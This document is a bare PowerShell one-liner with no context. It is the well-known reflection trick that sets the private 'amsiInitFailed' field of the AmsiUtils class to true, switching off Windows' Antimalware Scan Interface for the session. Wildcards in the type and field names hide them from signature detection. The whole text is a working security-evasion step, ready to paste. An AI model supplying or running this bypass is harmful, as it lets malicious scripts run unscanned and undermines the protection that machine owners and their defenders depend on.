(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
